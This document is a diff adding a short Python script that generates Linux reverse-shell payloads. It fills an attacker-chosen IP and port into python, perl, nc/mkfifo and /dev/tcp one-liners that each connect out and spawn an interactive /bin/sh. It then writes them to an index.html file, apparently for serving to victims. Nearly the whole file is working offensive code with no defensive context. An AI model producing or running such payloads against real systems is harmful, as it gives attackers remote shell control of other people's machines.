@@ -1,0 +1,36 @@
+#!/usr/bin/env python
+import os, sys
+
+payload = '''
+if command -v python > /dev/null 2>&1; then
+        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("x.x.x.x",yyyy)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+        exit;
+fi
+
+if command -v perl > /dev/null 2>&1; then
+        perl -e 'use Socket;$i="x.x.x.x";$p=yyyy;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+        exit;
+fi
+
+if command -v nc > /dev/null 2>&1; then
+        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x yyyy >/tmp/f
+        exit;
+fi
+
+if command -v sh > /dev/null 2>&1; then
+        /bin/sh -i >& /dev/tcp/x.x.x.x/yyyy 0>&1
+        exit;
+fi
+'''
+
+if(len(sys.argv) < 3):
+    print("[?] Usage gen_lin_rev ip port")
+    exit(1)
+
+payload = payload.replace("x.x.x.x", sys.argv[1]).replace("yyyy", sys.argv[2])
+
+with open("index.html", "w") as f:
+    f.write("#! /bin/sh\n\n" + payload)
+
+print("[+] Wrote Linux reverse shells to {}/index.html".format(os.getcwd()))
+
